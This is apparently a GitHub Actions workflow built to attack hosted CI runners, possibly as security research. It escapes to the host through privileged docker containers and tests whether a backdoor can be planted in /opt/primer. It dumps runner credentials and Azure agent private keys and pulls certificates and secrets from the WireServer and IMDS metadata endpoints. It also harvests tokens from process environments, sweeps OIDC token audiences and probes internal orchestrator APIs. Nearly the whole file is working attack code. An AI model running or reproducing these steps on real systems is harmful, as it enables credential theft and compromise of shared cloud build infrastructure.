name: Primer Poison + Deep Persistence
on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  primer-poison:
    runs-on: ubuntu-latest
    steps:
      - name: 1 - Check primer writability and plant backdoor
        run: |
          echo "=== PRIMER WRITE TEST ==="
          docker run --rm --privileged -v /:/host alpine sh -c "
            echo '--- /opt/primer perms ---'
            ls -la /host/opt/primer/ 2>/dev/null || echo NO_OPT_PRIMER
            ls -la /host/opt/ 2>/dev/null
            stat /host/opt/primer/primer 2>/dev/null || echo NO_PRIMER_BINARY

            echo '--- CAN WE WRITE TO /opt/primer? ---'
            touch /host/opt/primer/PWNED_\$(date +%s).txt 2>&1 && echo 'DIR_WRITE_OK' || echo 'DIR_WRITE_BLOCKED'

            echo '--- PRIMER BINARY STRINGS (API calls/URLs) ---'
            strings /host/opt/primer/primer 2>/dev/null | grep -iE 'http|url|token|auth|github|azure|orchestrat|hosted|attestat|tpm|vtpm|maa|secret|key|cert' | head -80 || echo 'NO_PRIMER_STRINGS'

            echo '--- HCA BINARY STRINGS ---'
            find /host/opt -name 'hca' -o -name 'hosted-compute-agent' 2>/dev/null | head -3 | while read f; do
              echo \"=== strings \$f ===\"
              strings \"\$f\" 2>/dev/null | grep -iE 'http|url|token|auth|github|azure|orchestrat|hosted|attestat|tpm|vtpm|maa|secret|key|cert|attest' | head -80
            done

            echo '--- hosted-compute-agent systemd unit ---'
            find /host/etc/systemd /host/lib/systemd -name '*hosted*' -o -name '*primer*' -o -name '*hca*' 2>/dev/null | while read f; do
              echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null
            done

            echo '--- /opt/ full tree ---'
            find /host/opt -type f 2>/dev/null | head -50

            echo '--- /opt/hca full listing ---'
            find /host/opt/hca -type f 2>/dev/null 2>&1 | while read f; do
              echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null | head -30
            done

            echo '--- post-generation scripts ---'
            ls -la /host/opt/post-generation/ 2>/dev/null || echo NO_POST_GEN
            find /host/opt/post-generation -type f 2>/dev/null | while read f; do
              echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null
            done
          " 2>&1 || true

      - name: 2 - Extract MAA attestation endpoint and TPM/vTPM details
        run: |
          echo "=== ATTESTATION PROVIDER DISCOVERY ==="
          # The HC orchestrator returns 'unsupported attestation provider'
          # We need to find what attestation endpoint the hosted-compute-agent uses
          docker run --rm --privileged --network=host -v /:/host alpine sh -c "
            echo '--- MAA endpoint from IMDS ---'
            curl -sf -H 'Metadata:true' 'http://169.254.169.254/metadata/attested/document?api-version=2020-09-01' 2>/dev/null | head -200 || echo 'IMDS_ATTEST_FAIL'

            echo '--- IMDS attested document (nonce test) ---'
            curl -sf -H 'Metadata:true' 'http://169.254.169.254/metadata/attested/document?api-version=2020-09-01&nonce=PWNED123' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"ENCODING:\",d.get(\"encoding\",\"?\")); import base64; sig=d.get(\"signature\",\"\"); print(\"SIG_LEN:\",len(sig)); pay=d.get(\"signature\",\"\"); parts=pay.split(\".\"); [print(\"PART\",i,\":\",base64.b64decode(p+\"==\").decode(errors=\"replace\")[:300]) for i,p in enumerate(parts[:2]) if p]' 2>/dev/null || echo 'ATTEST_PARSE_FAIL'

            echo '--- TPM devices ---'
            ls -la /host/dev/tpm* 2>/dev/null || echo NO_TPM_DEVICES
            ls -la /dev/tpm* 2>/dev/null || echo NO_TPM_DEVICES_CONTAINER

            echo '--- Azure vTPM / MAA sockets ---'
            ls -la /host/run/*.sock 2>/dev/null | head -20
            ls -la /host/var/run/*.sock 2>/dev/null | head -20

            echo '--- hosted-compute-agent process and open files ---'
            pgrep -a hca 2>/dev/null || pgrep -a hosted-compute 2>/dev/null || echo NO_HCA_PROC
            ls -la /proc/\$(pgrep -f hosted-compute | head -1)/fd 2>/dev/null | head -30 || echo NO_HCA_FDS

            echo '--- environment of hosted-compute-agent ---'
            cat /proc/\$(pgrep -f hosted-compute | head -1)/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'token|auth|url|azure|github|secret|key|maa|attest' || echo NO_HCA_ENV

            echo '--- HCA config files ---'
            find /host/etc -name '*hca*' -o -name '*hosted-compute*' -o -name '*primer*' 2>/dev/null | while read f; do
              echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null
            done
            find /host/var -name '*hca*' -o -name '*hosted-compute*' 2>/dev/null | head -10 | while read f; do
              echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null | head -20
            done

            echo '--- MAA attestation URL from env ---'
            cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'maa|attest|azure|token|github' || echo NO_PID1_ENV_ATTEST
          " 2>&1 || true

      - name: 3 - gh-aw-mcpg and gh-aw-firewall container internals
        run: |
          echo "=== GH-AW-MCPG INTERNALS ==="
          # Pull and inspect the MCP gateway container
          docker pull ghcr.io/github/gh-aw-mcpg:latest 2>&1 | tail -5 || true
          docker run --rm --entrypoint /bin/sh ghcr.io/github/gh-aw-mcpg:latest -c "
            echo '--- Process list ---'; ps aux 2>/dev/null || true
            echo '--- ENV ---'; printenv | grep -iE 'token|auth|url|github|azure|secret|key|api' | head -30
            echo '--- Config files ---'
            find / -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.toml' -o -name '*.env' 2>/dev/null | grep -v proc | head -20 | while read f; do
              echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null | head -40
            done
            echo '--- Binary strings for API endpoints ---'
            find /usr /app /opt /bin /sbin -type f -executable 2>/dev/null | head -10 | while read b; do
              strings \"\$b\" 2>/dev/null | grep -iE 'https?://|token|auth|orchestrat|hosted|github|azure' | head -20
            done
            echo '--- /app directory ---'
            ls -laR /app 2>/dev/null | head -50
            echo '--- /etc/ interesting files ---'
            cat /etc/mcpg* 2>/dev/null || true
          " 2>&1 || true

          echo ""
          echo "=== GH-AW-FIREWALL/AGENT INTERNALS ==="
          docker run --rm --entrypoint /bin/sh ghcr.io/github/gh-aw-firewall/agent:latest -c "
            echo '--- ENV ---'; printenv | grep -iE 'token|auth|url|github|azure|secret|key|api|rule|allow|block' | head -30
            echo '--- Config ---'
            find /etc /app /opt -type f \( -name '*.json' -o -name '*.yaml' -o -name '*.conf' \) 2>/dev/null | head -15 | while read f; do
              echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null | head -30
            done
            echo '--- nftables/iptables rules loaded ---'
            iptables -L -n 2>/dev/null | head -40 || echo NO_IPTABLES
            nft list ruleset 2>/dev/null | head -40 || echo NO_NFT
          " 2>&1 || true

      - name: 4 - Runner credentials and internal token extraction
        run: |
          echo "=== RUNNER CREDENTIALS ==="
          docker run --rm --privileged -v /:/host alpine sh -c "
            echo '--- .credentials file ---'
            cat /host/home/runner/actions-runner/.credentials 2>/dev/null || echo NO_CREDS

            echo '--- .credentials_rsaparams ---'
            cat /host/home/runner/actions-runner/.credentials_rsaparams 2>/dev/null || echo NO_RSA

            echo '--- runner .env file ---'
            cat /host/home/runner/actions-runner/.env 2>/dev/null || echo NO_ENV

            echo '--- runner runner-idhash ---'
            cat /host/home/runner/actions-runner/.runner 2>/dev/null || echo NO_RUNNER_FILE

            echo '--- /home/runner/ full listing ---'
            find /host/home/runner -type f 2>/dev/null | head -40

            echo '--- /var/lib/waagent/ full listing ---'
            ls -la /host/var/lib/waagent/ 2>/dev/null | head -30

            echo '--- TransportCert ---'
            cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null | head -30

            echo '--- TransportPrivate ---'
            cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null

            echo '--- Certificates.pem (private keys) ---'
            cat /host/var/lib/waagent/Certificates.pem 2>/dev/null

            echo '--- OVF-env.xml ---'
            cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null

            echo '--- WireServer GoalState ---'
            curl -sf -H 'x-ms-version: 2012-11-30' http://168.63.129.16/machine/?comp=goalstate 2>/dev/null | head -60 || echo WS_BLOCKED

            echo '--- WireServer Certificates endpoint ---'
            CONTAINER_ID=\$(curl -sf -H 'x-ms-version: 2012-11-30' http://168.63.129.16/machine/?comp=goalstate 2>/dev/null | grep -o '<ContainerId>[^<]*' | cut -d'>' -f2)
            INSTANCE_ID=\$(curl -sf -H 'x-ms-version: 2012-11-30' http://168.63.129.16/machine/?comp=goalstate 2>/dev/null | grep -o '<InstanceId>[^<]*' | cut -d'>' -f2)
            echo \"ContainerId=\$CONTAINER_ID InstanceId=\$INSTANCE_ID\"
            if [ -n \"\$CONTAINER_ID\" ]; then
              curl -sf -H 'x-ms-version: 2012-11-30' \
                \"http://168.63.129.16/machine/\$CONTAINER_ID/\$INSTANCE_ID?comp=certificates\" 2>/dev/null | head -100 || echo WS_CERT_BLOCKED
            fi
          " 2>&1 || true

      - name: 5 - OIDC multi-audience + HC attestation bypass attempt
        run: |
          echo "=== OIDC AUDIENCE SWEEP ==="
          for AUD in \
            "api://hosted-compute-ro" \
            "api://hosted-compute" \
            "api://hosted-compute-attestation" \
            "api://hosted-compute-agent" \
            "api://hosted-compute-maa" \
            "api://AzureADTokenExchange" \
            "api://github-actions-runner" \
            "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com" \
            "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com"; do
            ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$AUD', safe=''))")
            JWT=$(curl -sf \
              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${ENC}" | jq -r .value 2>/dev/null)
            echo "AUD=$AUD LEN=${#JWT}"
          done

          echo ""
          echo "=== TRYING HC ORCHESTRATOR WITH base_ro_url FROM IMDS TAGS ==="
          # Use the CORRECT orchestrator URL from this VM's tags
          TAGS=$(curl -sf -H "Metadata:true" \
            "http://169.254.169.254/metadata/instance/compute/tags?api-version=2021-02-01&format=text" || echo "")
          BASE_RO_URL=$(echo "$TAGS" | tr ';' '\n' | grep 'hosted_compute.base_ro_url' | cut -d: -f2- | tr -d '[:space:]' | sed 's|https||' | xargs -I{} echo "https{}")
          echo "BASE_RO_URL from IMDS: $BASE_RO_URL"

          HC_JWT=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" | jq -r .value)
          ALLOC_ID=$(echo "$TAGS" | tr ';' '\n' | grep allocation_id | cut -d: -f2 | tr -d '[:space:]')

          if [ -n "$BASE_RO_URL" ]; then
            echo "=== Calling CORRECT orchestrator: $BASE_RO_URL ==="
            for ENDPOINT in "" "/allocations/$ALLOC_ID" "/vms" "/pools" "/images" "/jobs" "/queues"; do
              echo "--- GET $BASE_RO_URL$ENDPOINT ---"
              curl -sv \
                -H "Authorization: Bearer $HC_JWT" \
                -H "Accept: application/json" \
                -H "X-GitHub-Repo: 0xl3v1n/ci-lab-test" \
                -H "X-GitHub-Run-ID: $GITHUB_RUN_ID" \
                "${BASE_RO_URL}${ENDPOINT}" 2>&1 | grep -E 'HTTP/|error|{|allocation|vm|pool' | head -10
              sleep 0.5
            done
          fi

          echo ""
          echo "=== IMDS ATTESTED DOCUMENT (for MAA attestation) ==="
          curl -sf -H "Metadata:true" \
            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01&nonce=pwn2own2026" 2>/dev/null | \
            python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
sig = d.get('signature','')
parts = sig.split('.')
for i,p in enumerate(parts[:2]):
  try:
    pad = p + '=='
    decoded = base64.urlsafe_b64decode(pad).decode(errors='replace')
    print(f'ATTEST_PART_{i}: {decoded[:500]}')
  except: pass
print('ATTEST_ENCODING:', d.get('encoding','?'))
print('FULL_SIG_LEN:', len(sig))
" 2>/dev/null || echo 'ATTEST_FAIL'

          echo ""
          echo "=== WireServer ExtensionsConfig (may contain internal secrets) ==="
          docker run --rm --privileged --network=host -v /:/host alpine sh -c "
            # Get GoalState and fetch ExtensionsConfig URL
            GS=\$(curl -sf -H 'x-ms-version: 2012-11-30' 'http://168.63.129.16/machine/?comp=goalstate' 2>/dev/null)
            echo 'GoalState snippet:'; echo \"\$GS\" | head -30
            EXT_URL=\$(echo \"\$GS\" | grep -o '<ExtensionsConfig>[^<]*' | cut -d'>' -f2)
            echo \"ExtensionsConfig URL: \$EXT_URL\"
            if [ -n \"\$EXT_URL\" ]; then
              curl -sf \"\$EXT_URL\" 2>/dev/null | head -100 || echo EXT_BLOCKED
            fi

            echo '--- vmSettings FastTrack (port 32526) ---'
            curl -sf 'http://168.63.129.16:32526/vmSettings' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(json.dumps(d, indent=2))' 2>/dev/null | head -80 || echo VMSETTINGS_BLOCKED
          " 2>&1 || true
